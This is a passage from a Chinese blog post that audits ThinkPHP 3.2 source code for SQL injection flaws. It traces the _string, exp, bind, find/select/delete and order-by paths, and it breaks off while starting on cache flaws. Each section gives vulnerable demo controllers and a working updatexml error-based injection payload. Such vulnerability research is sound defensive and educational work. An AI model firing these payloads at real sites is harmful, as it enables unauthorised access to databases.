F7进入，I方法获取传入的参数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string">'get'</span>     <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'post'</span>    <span class="token punctuation">:</span>               <span class="token variable">$input</span> <span class="token operator">=</span><span class="token operator">&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'put'</span>     <span class="token punctuation">:</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>            <span class="token punctuation">}</span>            <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string">'param'</span>   <span class="token punctuation">:</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_POST</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">'PUT'</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$_PUT</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'), $_PUT);</span>                    <span class="token punctuation">}</span>                    <span class="token variable">$input</span>     <span class="token operator">=</span>    <span class="token variable">$_PUT</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                    <span class="token variable">$input</span>  <span class="token operator">=</span>  <span class="token variable">$_GET</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>重点看过滤函数</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg" alt="" loading="lazy"></p><p>先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">think_filter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在where方法中，将$where的值放入到options[“where”]数组中</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png" alt="" loading="lazy"></p><p>继续跟进查看find方法，第748行</p><pre class=" language-php"><code class="language-php"><span class="token variable">$options</span>     <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_parseOptions</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在数组$options中增加’table’=&gt;’tp_user’，’model’=&gt;’User’，随后F7跟进select方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">buildSelectSql</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span>   <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png" alt="" loading="lazy"></p><p>这里主要查看parseWhere方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png" alt="" loading="lazy"></p><p>跟进parseThinkWhere方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseThinkWhere</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$val</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span>   <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">case</span> <span class="token string">'_string'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 字符串模式查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$val</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'_complex'</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">// 复合查询条件</span>                <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span></code></pre><p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为</p><pre><code>1) and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png" alt="" loading="lazy"></p><h4 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a><strong>exp注入</strong></h4><p>漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$User</span> <span class="token operator">=</span> <span class="token function">D</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$map</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'id'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$User</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$map</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>直接在$user进行断点，F7跟进，跳过where方法，跟进find-&gt;select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png" alt="" loading="lazy"></p><p>跟进parseWhereItem方法，此时参数$val为一个数组，{‘exp’,’sql注入exp’}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png" alt="" loading="lazy"></p><p>此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为</p><pre><code>id[0]=exp&amp;id[1]==1 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))--+</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png" alt="" loading="lazy"></p><p>上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a><strong>bind注入</strong></h4><p>漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span>  <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$uname</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$uname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>F8跟进save方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png" alt="" loading="lazy"></p><p>生成sql语句在update方法中</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span>  <span class="token operator">=</span>   <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseBind</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'bind'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$table</span>  <span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseTable</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'table'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sql</span>   <span class="token operator">=</span> <span class="token string">'UPDATE '</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseSet</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// 多表更新支持JOIN操作</span>            <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseJoin</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'join'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//  单表更新支持order和lmit</span>            <span class="token variable">$sql</span>   <span class="token punctuation">.</span><span class="token operator">=</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseLimit</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>在parseSet方法中，可以将传入的参数替换成:0</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png" alt="" loading="lazy"></p><p>在bindParam方法中，$this-&gt;bind属性返回array(‘:0’=&gt;参数值)</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bind</span><span class="token punctuation">[</span><span class="token string">':'</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进parseWhere-&gt;parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png" alt="" loading="lazy"></p><p>由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png" alt="" loading="lazy"></p><p>所以最终的payload为</p><pre><code>id[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxing</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png" alt="" loading="lazy"></p><h4 id="find-select-delete注入"><a href="#find-select-delete注入" class="headerlink" title="find/select/delete注入"></a><strong>find/select/delete注入</strong></h4><p>先分析find注入，在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当传入id[where]=1p时候，在user进行断点，F7跟进find-&gt;_parseOptions方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png" alt="" loading="lazy"></p><p>$options[‘where’]为字符串，导致不能执行_parseType方法转化数据，进行跟进select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere方法，传入的$where为字符串，直接执行了if语句</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 直接使用字符串条件</span>            <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whereStr</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">''</span><span class="token punctuation">:</span><span class="token string">' WHERE '</span><span class="token punctuation">.</span><span class="token variable">$whereStr</span><span class="token punctuation">;</span></code></pre><p>当传入id=1p，就不能进行注入了，具体原因在find-&gt;_parseOptions-&gt;_parseType方法，将传入的参数进行了强转化为整形</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png" alt="" loading="lazy"></p><p>所以，payload为</p><pre><code>?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png" alt="" loading="lazy"></p><p>select和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果条件为空 不进行删除操作 除非设置 1=1</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$pkValue</span>            <span class="token operator">=</span>  <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_before_delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>   </code></pre><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h4><p>先在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'eq'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">order</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'order'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在user变量处断点，F7跟进，find-&gt;select-&gt;buildSelectSql-&gt;parseSql方法</p><pre class=" language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre><p>当$options[‘order’]参数参在时，跟进parseOrder方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png" alt="" loading="lazy"></p><p>当不为数组时，直接返回order by + 注入pyload，所以注入payload为</p><pre><code>order=id and(updatexml(1,concat(0x7e,(select user())),0))</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png" alt="" loading="lazy"></p><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a><strong>缓存漏洞</strong></h4><p>在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下</p><pre><code>F方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。S方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。</code></pre><p>这里F方法就不介绍了，直接看S方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">S</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进查看S方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png" alt="" loading="lazy"></p><p>set方法写入缓存</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png" 